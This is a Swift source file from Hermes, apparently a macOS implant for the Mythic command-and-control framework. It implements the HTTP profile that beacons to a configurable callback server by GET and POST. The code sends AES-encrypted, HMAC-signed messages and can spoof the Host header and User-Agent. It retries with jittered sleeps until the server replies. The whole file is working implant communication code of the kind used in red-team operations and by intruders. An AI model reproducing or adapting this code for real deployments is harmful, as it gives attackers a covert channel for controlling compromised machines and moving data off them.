//
//  http.swift
//  Hermes
//
//  Created by slyd0g on 5/23/21.
//  Refactored to implement C2Profile protocol
//

import Foundation

// HTTP Profile implementation conforming to C2Profile protocol
class HTTPProfile: C2Profile {
    private let dispatch = DispatchGroup()
    private var connected: Bool = false
    
    var profileName: String {
        return "http"
    }
    
    var isConnected: Bool {
        return connected
    }
    
    // Initialize the HTTP profile
    func initialize() -> Bool {
        connected = true
        return true
    }
    
    // Send data through HTTP - uses POST for all communications
    // The profile manager handles the unified send interface
    func send(data: String) -> String {
        return post(data: data)
    }
    
    // GET function - used internally for specific operations
    func get(data: String) -> String {
        dispatch.enter()
        var results = ""
        
        // Prepare URL
        var getURLComponents = URLComponents()
        
        getURLComponents.host = agentConfig.callbackHost
        getURLComponents.path = agentConfig.getRequestURI
        getURLComponents.port = agentConfig.callbackPort
        // Stuffing data into query parameter
        getURLComponents.queryItems = [URLQueryItem(name: agentConfig.queryParameter, value: data)]
        getURLComponents.percentEncodedQuery = getURLComponents.percentEncodedQuery?.replacingOccurrences(of: "+", with: "%2B")
        getURLComponents.percentEncodedQuery = getURLComponents.percentEncodedQuery?.replacingOccurrences(of: "/", with: "%2F")

        if (agentConfig.useSSL) {
            getURLComponents.scheme = "https"
        }
        else
        {
            getURLComponents.scheme = "http"
        }
        
        // Prepare URL Request Object
        let url = getURLComponents.url
        guard let requestUrl = url else { fatalError() }
        var request = URLRequest(url: requestUrl)
        request.httpMethod = "GET"
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        if agentConfig.hostHeader == "" {
            request.setValue(agentConfig.callbackHost, forHTTPHeaderField: "Host")
        }
        else {
            request.setValue(agentConfig.hostHeader, forHTTPHeaderField: "Host")
        }
        if !agentConfig.httpHeaders.isEmpty {
            for header in agentConfig.httpHeaders {
                request.setValue(header.value, forHTTPHeaderField: header.key)
            }
        }
        
        // Perform HTTP Request
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, _, error in
            if (error != nil) {
                print(error as Any)
            }
            results = String(data: data ?? toData(string: "NO_CONNECT"), encoding: .utf8)!
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        return results
    }

    // POST function - primary method for sending data
    func post(data: String) -> String {
        dispatch.enter()
        var results = ""
        
        // Prepare URL
        var postURLComponents = URLComponents()
        
        postURLComponents.host = agentConfig.callbackHost
        postURLComponents.path = agentConfig.postRequestURI
        postURLComponents.port = agentConfig.callbackPort
        if (agentConfig.useSSL) {
            postURLComponents.scheme = "https"
        }
        else
        {
            postURLComponents.scheme = "http"
        }
        
        // Prepare URL Request Object, set HTTP headers
        let url = postURLComponents.url
        guard let requestUrl = url else { fatalError() }
        var request = URLRequest(url: requestUrl)
        request.httpMethod = "POST"
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        if agentConfig.hostHeader == "" {
            request.setValue(agentConfig.callbackHost, forHTTPHeaderField: "Host")
        }
        else {
            request.setValue(agentConfig.hostHeader, forHTTPHeaderField: "Host")
        }
        if !agentConfig.httpHeaders.isEmpty {
            for header in agentConfig.httpHeaders {
                request.setValue(header.value, forHTTPHeaderField: header.key)
            }
        }
        
        // Set HTTP Request Body
        request.httpBody = data.data(using: String.Encoding.utf8);
        // Perform HTTP Request
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, _, _ in
            results = String(data: data ?? toData(string: "NO_CONNECT"), encoding: .utf8)!
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        return results
    }
}

// Legacy wrapper functions for backward compatibility during transition
// These will be removed once all code is migrated to use the protocol

let httpProfileLegacy = HTTPProfile()

func get(data: String) -> String {
    return httpProfileLegacy.get(data: data)
}

func post(data: String) -> String {
    return httpProfileLegacy.post(data: data)
}

// Legacy sendHermesMessage with httpMethod parameter for backward compatibility
func sendHermesMessage(jsonMessage: JSON, payloadUUID: Data, decodedAESKey: Data, httpMethod: String) -> JSON {
    // Generate iv, encrypt message, and determine hmac
    let iv = generateIV()
    let ciphertext = try! CC.crypt(.encrypt, blockMode: .cbc, algorithm: .aes, padding: .pkcs7Padding, data: jsonMessage.rawData(), key: decodedAESKey, iv: iv)
    let hmac = CC.HMAC(iv+ciphertext, alg: .sha256, key: decodedAESKey)

    // Assemble staging_rsa message B64(PayloadUUID + IV + Ciphertext + HMAC)
    let hermesMessage = toBase64(data: payloadUUID + iv + ciphertext + hmac)

    // Send message to Mythic
    var mythicMessage = "NO_CONNECT"
    if (httpMethod == "get") {
        while mythicMessage == "NO_CONNECT" {
            mythicMessage = get(data: hermesMessage)
            if mythicMessage == "NO_CONNECT" {
                sleepWithJitter()
            }
        }
    }
    else {
        while mythicMessage == "NO_CONNECT" {
            mythicMessage = post(data: hermesMessage)
            if mythicMessage == "NO_CONNECT" {
                sleepWithJitter()
            }
        }
    }
    // Decode and decrypt Mythic message to JSON string
    let decryptedMythicMessage = decryptMythicMessage(mythicMessage: mythicMessage, key: decodedAESKey, iv: iv)

    // Convert JSON string to object
    let jsonResponse = JSON.init(parseJSON:decryptedMythicMessage)
    
    return jsonResponse
}
